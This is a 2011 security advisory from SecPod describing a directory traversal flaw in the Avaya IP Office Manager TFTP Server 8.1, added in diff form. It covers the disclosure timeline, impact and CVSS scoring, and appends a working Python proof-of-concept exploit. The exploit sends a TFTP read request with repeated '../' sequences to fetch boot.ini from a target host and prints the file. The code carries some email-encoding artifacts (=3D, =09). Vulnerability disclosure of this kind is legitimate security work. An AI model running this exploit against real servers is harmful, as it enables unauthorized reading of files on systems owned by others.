@@ -1,0 +1,137 @@
+##############################################################################
+
+Title    : Avaya IP Office Manager TFTP Server Directory Traversal Vulnerability
+Author   : Veerendra G.G from SecPod Technologies (www.secpod.com)
+Vendor   : http://www.avaya.com/usa/product/ip-office
+Advisory : http://www.avaya.com/usa/product/ip-office
+           http://secpod.org/SECPOD_Avaya-IP-Manager-TFTP-Dir-Trav.pcap
+           http://secpod.org/SECPOD_Exploit-Avaya-IP-Manager-Dir-Trav.py
+           http://secpod.org/advisories/SECPOD_Avaya_IP_Manager_TFTP_Dir_Trav.txt
+Version  : Avaya IP Office Manager TFTP Server Version 8.1
+Date     : 08/07/2011
+
+###############################################################################
+
+SecPod ID: 1017					25/05/2011 Issue Discovered
+                                                31/05/2011 Vendor Notified
+                                                No Response from the Vendor
+                          		        08/07/2011 Advisory Released
+					       
+
+Class: Information Disclosure			Severity: Medium
+
+
+Overview:
+---------
+Avaya IP Office Manager TFTP Server Version 8.1 is prone to a Directory
+Traversal vulnerability.
+
+
+Technical Description:
+----------------------
+The vulnerability is caused due to improper validation to Read Request
+Parameter containing '../' sequences, which allows attackers to read
+arbitrary files via directory traversal attacks.
+
+
+Impact:
+--------
+Successful exploitation could allow an attacker to to obtain sensitive
+information, which can lead to launching further attacks.
+
+
+Affected Software:
+------------------
+Avaya IP Office Manager TFTP Server Version 8.1
+
+
+Tested on:
+-----------
+Avaya IP Office Manager TFTP Server Version 8.1 on Windows XP SP3.
+
+
+References:
+-----------
+http://secpod.org/blog/?p=225
+http://www.avaya.com/usa/product/ip-office
+http://secpod.org/SECPOD_Avaya-IP-Manager-TFTP-Dir-Trav.pcap
+http://secpod.org/SECPOD_Exploit-Avaya-IP-Manager-Dir-Trav.py
+http://secpod.org/advisories/SECPOD_Avaya_IP_Manager_TFTP_Dir_Trav.txt
+
+
+Proof of Concept:
+----------------
+http://secpod.org/SECPOD_Exploit-Avaya-IP-Manager-Dir-Trav.py
+http://secpod.org/SECPOD_Avaya-IP-Manager-TFTP-Dir-Trav.pcap
+
+
+Solution:
+----------
+Not available
+
+
+Risk Factor:
+-------------
+    CVSS Score Report: 
+        ACCESS_VECTOR          = NETWORK 
+        ACCESS_COMPLEXITY      = LOW 
+        AUTHENTICATION         = NOT_REQUIRED 
+        CONFIDENTIALITY_IMPACT = PARTIAL 
+        INTEGRITY_IMPACT       = NONE 
+        AVAILABILITY_IMPACT    = NONE 
+        EXPLOITABILITY         = PROOF_OF_CONCEPT 
+        REMEDIATION_LEVEL      = UNAVAILABLE 
+        REPORT_CONFIDENCE      = CONFIRMED 
+        CVSS Base Score        = 5.0 (AV:N/AC:L/Au:NR/C:P/I:N/A:N) 
+        CVSS Temporal Score    = 4.5 
+        Risk factor            = Medium 
+
+
+Credits:
+--------
+Veerendra G.G of SecPod Technologies has been credited with the discovery of
+this vulnerability.
+
+
+SECPOD_Exploit-Avaya-IP-Manager-Dir-Trav.py:
+
+#!/usr/bin/python
+##############################################################################
+# Exploit   : http://secpod.org/blog/?p=3D225
+#             http://secpod.org/SECPOD_Exploit-Avaya-IP-Manager-Dir-Trav.py
+#             http://secpod.org/advisories/SECPOD_Avaya_IP_Manager_TFTP_Dir_Trav.txt
+# Author    : Veerendra G.G from SecPod Technologies (www.secpod.com)
+#
+# Get File content using Directory Traversal Attack
+# Tested against Avaya Office IP Manager 8.1
+##############################################################################
+
+def sendPacket(HOST, PORT, data):
+    '''
+    Sends UDP Data to a Particular Host on a Specified Port
+    with a Given Data and Return the Response
+    '''
+    udp_sock =3D socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    udp_sock.sendto(data, (HOST, PORT))
+    data =3D udp_sock.recv(1024)
+    udp_sock.close()
+    return data
+
+if __name__ =3D=3D "__main__":
+
+    if len(sys.argv) < 2:
+        print "\tUsage: python exploit.py target_ip"
+        print "\tExample : python exploit.py 127.0.0.1"
+        print "\tExiting..."
+        sys.exit(0)
+
+    HOST =3D sys.argv[1]       =09=09=09## The Server IP
+    PORT =3D 69                =09=09=09## Default TFTP port
+
+    data =3D "\x00\x01"        =09=09=09## TFTP Read Request
+    data +=3D "../" * 10 + "boot.ini" + "\x00"=09## Read boot.ini file using directory traversal
+    data +=3D "octet\x00"=09=09=09=09## TFTP Type
+
+    rec_data =3D sendPacket(HOST, PORT, data)
+    print "Data Found on the target : %s " %(HOST)
+    print rec_data.strip()
